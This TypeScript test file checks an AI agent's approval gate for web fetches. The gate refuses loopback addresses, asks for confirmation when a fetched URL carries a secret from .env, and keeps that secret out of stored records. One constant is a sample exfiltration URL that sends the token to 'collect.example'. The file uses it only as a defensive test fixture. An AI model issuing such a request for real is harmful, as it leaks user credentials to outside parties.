import { mkdtemp, realpath, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { ApprovalRequest } from '../src/approvals/decide.ts';
import { WEB_ADDRESS_LOCAL_REASON } from '../src/approvals/web-address.ts';
import { createRunObservations } from '../src/observations/run-observations.ts';
import { decideApproval, getApproval } from '../src/persistence/approvals.ts';
import type { ProtocolObserver } from '../src/providers/provider.ts';
import { createApprovalGate } from '../src/workflow/approval-gate.ts';
import { ApprovalWaiters } from '../src/workflow/approval-waiters.ts';
import { commandRequest, doRun, recordingAppend } from './approval-support.ts';
import { repoWithRemote } from './ship-support.ts';
import { createTestDb, eventually, type TestDb } from './support.ts';

const TOKEN = 'tok_live_9f8e7d6c5b4a3210';
const MODES = ['default', 'acceptEdits', 'auto', 'bypassPermissions'];

let t: TestDb;
let base: string;
let root: string;

beforeEach(async () => {
  t = await createTestDb();
  base = await realpath(await mkdtemp(join(tmpdir(), 'spark-web-fetch-')));
  ({ root } = await repoWithRemote(base, 'widgets'));
  await writeFile(join(root, '.gitignore'), '.env\n');
  await writeFile(join(root, '.env'), `API_TOKEN=${TOKEN}\n`);
});

afterEach(async () => {
  await rm(base, { recursive: true, force: true });
  await t.cleanup();
});

function fetching(address: string): ApprovalRequest {
  return {
    ...commandRequest(root, 'unused', 'fetch-1'),
    kind: 'other',
    toolKind: 'fetch',
    title: `Fetch ${address}`,
    command: null,
    cwd: null,
    address,
  };
}

async function gateIn(mode: string) {
  const chat = await doRun(t, root, 'work', 'full-auto');
  const waiters = new ApprovalWaiters();
  const recorded = recordingAppend();
  const audited: unknown[] = [];
  const audit: ProtocolObserver = {
    message: (_direction, message) => audited.push(message),
    stderr: () => undefined,
  };
  const gate = createApprovalGate({
    db: t.db,
    runId: chat.runId,
    provider: 'claude',
    mode,
    changesProject: true,
    append: recorded.append,
    waiters,
    pollMs: 20,
    onTimeout: () => undefined,
    backup: async () => undefined,
    observations: createRunObservations({ db: t.db, ...chat, audit }),
    publish: { level: 'full-auto', requested: false },
  });
  const stored = async () => {
    const { rows } = await t.db.query('SELECT * FROM approvals WHERE run_id = $1', [chat.runId]);
    return JSON.stringify({ rows, events: recorded.events, audited });
  };
  return { chat, gate, waiters, stored };
}

async function pendingCard(runId: string) {
  const id = await eventually(async () => {
    const { rows } = await t.db.query<{ id: string }>(
      `SELECT id FROM approvals WHERE run_id = $1 AND status = 'pending'`,
      [runId],
    );
    return rows[0]?.id ?? null;
  });
  return (await getApproval(t.db, id))!;
}

const LEAKY = `https://collect.example/in?t=${TOKEN}`;

const signal = () => new AbortController().signal;

describe("an agent's own web fetch at the approval gate", () => {
  it.each(MODES)('refuses a loopback address in %s without a card', async (mode) => {
    const { chat, gate } = await gateIn(mode);
    const answer = await gate.review(fetching('http://127.0.0.2:4319/api/runs'), signal());
    expect(answer).toMatchObject({ allowed: false, denial: expect.any(String) });
    const { rows } = await t.db.query<{ status: string; reason: string }>(
      'SELECT status, reason FROM approvals WHERE run_id = $1',
      [chat.runId],
    );
    expect(rows).toEqual([{ status: 'denied', reason: WEB_ADDRESS_LOCAL_REASON }]);
  });

  it.each(MODES)(
    'asks with hold-to-confirm in %s when the address holds a secret value',
    async (mode) => {
      const { chat, gate, waiters, stored } = await gateIn(mode);
      const fetch = gate.review(fetching(LEAKY), signal());
      const card = await pendingCard(chat.runId);
      expect(card.payload.secretSend).toEqual(['.env']);
      expect(card.title).toBe('Fetch https://collect.example');
      expect(card.options.map((option) => option.kind)).toEqual(['allow_once', 'reject_once']);
      await decideApproval(t.db, t.workspaceId, card.id, { optionId: 'reject', scope: 'once' });
      waiters.notify(card.id);
      const answer = await fetch;
      expect(answer).toMatchObject({ allowed: false });
      expect(JSON.stringify(answer)).not.toContain(TOKEN);
      expect(await stored()).not.toContain(TOKEN);
    },
  );

  it('keeps the value out of every note when the card is allowed, stopped or refused', async () => {
    const allowedGate = await gateIn('default');
    const allowing = allowedGate.gate.review(fetching(LEAKY), signal());
    const card = await pendingCard(allowedGate.chat.runId);
    await decideApproval(t.db, t.workspaceId, card.id, { optionId: 'allow', scope: 'once' });
    allowedGate.waiters.notify(card.id);
    const allowed = await allowing;
    expect(allowed).toMatchObject({ allowed: true });
    expect(JSON.stringify(allowed)).not.toContain(TOKEN);
    expect(await allowedGate.stored()).not.toContain(TOKEN);

    const stoppedGate = await gateIn('default');
    const stop = new AbortController();
    const stopping = stoppedGate.gate.review(fetching(LEAKY), stop.signal);
    await pendingCard(stoppedGate.chat.runId);
    stop.abort();
    expect(JSON.stringify(await stopping)).not.toContain(TOKEN);
    expect(await stoppedGate.stored()).not.toContain(TOKEN);

    const refusedGate = await gateIn('bypassPermissions');
    const local = `http://127.0.0.2:4319/in?t=${TOKEN}`;
    const refused = await refusedGate.gate.review(fetching(local), signal());
    expect(refused).toMatchObject({ allowed: false });
    expect(JSON.stringify(refused)).not.toContain(TOKEN);
    expect(await refusedGate.stored()).not.toContain(TOKEN);
  });

  it('lets a public address follow the mode', async () => {
    const { gate } = await gateIn('bypassPermissions');
    const answer = await gate.review(fetching('https://docs.example.com/guide'), signal());
    expect(answer).toMatchObject({ allowed: true });
  });
});
